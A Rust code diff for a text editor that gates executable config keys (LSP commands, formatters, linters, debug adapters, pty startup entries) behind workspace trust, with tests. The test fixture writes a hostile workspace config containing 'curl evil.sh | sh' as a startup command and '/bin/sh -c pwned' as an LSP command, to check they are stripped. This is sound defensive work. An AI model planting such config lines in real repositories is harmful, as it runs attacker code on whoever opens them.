@@ -2312,14 +2312,37 @@ pub enum ClaudeMultiMode {
 
 impl Config {
     /// Load + merge. Never fails — a malformed file is reported on stderr and skipped.
+    ///
+    /// The workspace layer is loaded with `allow_exec` set from the
+    /// workspace's trust state (see [`crate::workspace_trust`]). An
+    /// untrusted workspace still contributes every ordinary key —
+    /// theme, keymaps, editor prefs — but its executable-bearing keys
+    /// are dropped, so cloning a repo and opening it can't run
+    /// anything. The home and `--config` layers are always trusted:
+    /// the user wrote one and typed the other on the command line.
     pub fn load(explicit: Option<&Path>, workspace: &Path) -> Config {
+        let claims = crate::workspace_trust::scan(workspace);
+        let trusted = claims.is_empty()
+            || crate::workspace_trust::is_trusted(
+                workspace,
+                &crate::workspace_trust::fingerprint(&claims),
+            );
+        Config::load_with_trust(explicit, workspace, trusted)
+    }
+
+    /// [`Config::load`] with the workspace-trust decision supplied by
+    /// the caller. Used at startup (where the decision is computed
+    /// once, alongside the prompt) and again after the user answers
+    /// the trust dialog, to re-materialise the config with the
+    /// workspace's exec keys now honoured.
+    pub fn load_with_trust(explicit: Option<&Path>, workspace: &Path, trusted: bool) -> Config {
         let mut cfg = Config::default();
         if let Some(home) = home_config_path() {
-            cfg.apply_file(&home);
+            cfg.apply_file_inner(&home, true);
         }
-        cfg.apply_file(&workspace.join(".mnml").join("config.toml"));
+        cfg.apply_file_inner(&workspace.join(".mnml").join("config.toml"), trusted);
         if let Some(p) = explicit {
-            cfg.apply_file(p);
+            cfg.apply_file_inner(p, true);
         }
         cfg
     }
@@ -2332,6 +2355,19 @@ impl Config {
     }
 
     fn apply_file(&mut self, path: &Path) {
+        self.apply_file_inner(path, true);
+    }
+
+    /// `allow_exec = false` drops every key that can execute a program
+    /// (see [`crate::workspace_trust::ExecKind`]) while merging the
+    /// rest normally. Only the workspace layer is ever loaded this way.
+    ///
+    /// The suppression is surgical rather than "skip the table": an
+    /// untrusted `[lsp.rust]` that only widens `extensions` keeps
+    /// working against the globally-configured binary, and only its
+    /// `cmd`/`args` are stripped. Same idea for `[[startup.layout]]`,
+    /// where `kind = "editor"` entries are harmless and survive.
+    fn apply_file_inner(&mut self, path: &Path, allow_exec: bool) {
         let text = match std::fs::read_to_string(path) {
             Ok(t) => t,
             Err(_) => return, // absent — fine
@@ -2937,7 +2973,11 @@ impl Config {
         }
         if let Some(s) = raw.ui.md_preview_engine {
             let trimmed = s.trim().to_string();
-            if !trimmed.is_empty() {
+            // Only the `custom:<cmd>` form executes; the named engines
+            // ("builtin" / "glow" / "pandoc") are vetted paths, so an
+            // untrusted workspace may still pick between those.
+            let executes = trimmed.starts_with("custom:");
+            if !trimmed.is_empty() && (allow_exec || !executes) {
                 self.ui.md_preview_engine = trimmed;
             }
         }
@@ -2964,7 +3004,13 @@ impl Config {
         for (k, v) in raw.keys {
             self.keys.entry(k).or_default().extend(v);
         }
-        for (k, v) in raw.lsp {
+        for (k, mut v) in raw.lsp {
+            if !allow_exec && let Some(t) = v.as_table_mut() {
+                // Keep extensions / root_markers / settings; drop only
+                // the binary this layer wanted to run.
+                t.remove("cmd");
+                t.remove("args");
+            }
             self.lsp.insert(k, v);
         }
         if let Some(v) = raw.ai {
@@ -3086,6 +3132,13 @@ impl Config {
                     }
                 }
                 "pty" => {
+                    // The no-interaction sink: a pty entry runs
+                    // `$SHELL -c <cmd>` at startup. An untrusted
+                    // workspace's pty entries are dropped; its editor
+                    // entries above are harmless and still apply.
+                    if !allow_exec {
+                        continue;
+                    }
                     let cmd = entry
                         .cmd
                         .as_deref()
@@ -3147,14 +3200,20 @@ impl Config {
         for (k, v) in raw.abbr {
             self.abbreviations.insert(k, v);
         }
-        for (ext, entry) in raw.formatters {
-            self.formatters.insert(ext, entry);
+        // Formatters / linters / DAP adapters are nothing BUT a command
+        // line, so an untrusted layer contributes nothing to keep.
+        if allow_exec {
+            for (ext, entry) in raw.formatters {
+                self.formatters.insert(ext, entry);
+            }
+            for (ext, entry) in raw.linters {
+                self.linters.insert(ext, entry);
+            }
         }
-        for (ext, entry) in raw.linters {
-            self.linters.insert(ext, entry);
-        }
-        for (name, v) in raw.dap {
-            self.dap.insert(name, v);
+        if allow_exec {
+            for (name, v) in raw.dap {
+                self.dap.insert(name, v);
+            }
         }
         if let Some(v) = raw.browser.headless {
             self.browser.headless = v;
@@ -4029,6 +4088,135 @@ fn home_config_path() -> Option<PathBuf> {
             .join("mnml")
             .join("config.toml")
     })
+}
+
+#[cfg(test)]
+mod workspace_trust_gate_tests {
+    use super::*;
+
+    /// A workspace whose config declares every exec-bearing key
+    /// alongside ordinary ones, so each test can assert the split.
+    fn hostile_workspace() -> tempfile::TempDir {
+        let d = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(d.path().join(".mnml")).unwrap();
+        std::fs::write(
+            d.path().join(".mnml/config.toml"),
+            r#"
+[ui]
+theme = "nord"
+md_preview_engine = "custom:evil.sh"
+
+[editor]
+input_style = "vim"
+
+[lsp.evil]
+cmd = "/bin/sh"
+args = ["-c", "pwned"]
+extensions = ["zzz"]
+
+[formatters.rs]
+cmd = "evil-fmt"
+
+[linters.rs]
+cmd = "evil-lint"
+
+[dap.evil]
+cmd = "evil-dap"
+
+[[startup.layout]]
+kind = "editor"
+path = "README.md"
+
+[[startup.layout]]
+kind = "pty"
+cmd = "curl evil.sh | sh"
+split = "down"
+"#,
+        )
+        .unwrap();
+        d
+    }
+
+    #[test]
+    fn untrusted_workspace_drops_every_exec_bearing_key() {
+        let d = hostile_workspace();
+        let cfg = Config::load_with_trust(None, d.path(), false);
+
+        // The LSP table survives (extensions still widen the mapping)
+        // but the binary it wanted to run is gone.
+        let lsp = cfg.lsp.get("evil").expect("table kept");
+        let t = lsp.as_table().unwrap();
+        assert!(t.get("cmd").is_none(), "lsp cmd must be stripped");
+        assert!(t.get("args").is_none(), "lsp args must be stripped");
+        assert!(t.get("extensions").is_some(), "benign keys kept");
+
+        assert!(!cfg.formatters.contains_key("rs"));
+        assert!(!cfg.linters.contains_key("rs"));
+        assert!(!cfg.dap.contains_key("evil"));
+        assert_ne!(cfg.ui.md_preview_engine, "custom:evil.sh");
+        assert!(
+            !cfg.startup_layout.iter().any(|e| e.kind == "pty"),
+            "pty startup entries must be dropped"
+        );
+    }
+
+    #[test]
+    fn untrusted_workspace_still_applies_ordinary_keys() {
+        // Restricted mode is not a broken editor — the same file's
+        // benign settings still take effect.
+        let d = hostile_workspace();
+        let cfg = Config::load_with_trust(None, d.path(), false);
+        assert_eq!(cfg.ui.theme, "nord");
+        assert_eq!(cfg.editor.input_style, "vim");
+        assert!(
+            cfg.startup_layout.iter().any(|e| e.kind == "editor"),
+            "editor startup entries are harmless and must survive"
+        );
+    }
+
+    #[test]
+    fn trusted_workspace_applies_exec_keys() {
+        let d = hostile_workspace();
+        let cfg = Config::load_with_trust(None, d.path(), true);
+        let t = cfg.lsp.get("evil").unwrap().as_table().unwrap();
+        assert_eq!(t.get("cmd").and_then(|v| v.as_str()), Some("/bin/sh"));
+        assert!(cfg.formatters.contains_key("rs"));
+        assert!(cfg.linters.contains_key("rs"));
+        assert!(cfg.dap.contains_key("evil"));
+        assert_eq!(cfg.ui.md_preview_engine, "custom:evil.sh");
+        assert!(cfg.startup_layout.iter().any(|e| e.kind == "pty"));
+    }
+
+    #[test]
+    fn named_md_preview_engines_survive_untrusted() {
+        // Only the `custom:` form executes; picking "glow" is a
+        // preference, not a command, so it isn't gated.
+        let d = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(d.path().join(".mnml")).unwrap();
+        std::fs::write(
+            d.path().join(".mnml/config.toml"),
+            "[ui]\nmd_preview_engine = \"glow\"\n",
+        )
+        .unwrap();
+        let cfg = Config::load_with_trust(None, d.path(), false);
+        assert_eq!(cfg.ui.md_preview_engine, "glow");
+    }
+
+    #[test]
+    fn workspace_with_no_claims_is_trusted_by_default() {
+        // The common case: an ordinary repo must never be treated as
+        // restricted, because it never prompts.
+        let d = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(d.path().join(".mnml")).unwrap();
+        std::fs::write(
+            d.path().join(".mnml/config.toml"),
+            "[ui]\ntheme = \"gruvbox\"\n",
+        )
+        .unwrap();
+        assert!(crate::workspace_trust::scan(d.path()).is_empty());
+        let cfg = Config::load(None, d.path());
+        assert_eq!(cfg.ui.theme, "gruvbox");
+    }
 }
 
 #[cfg(test)]
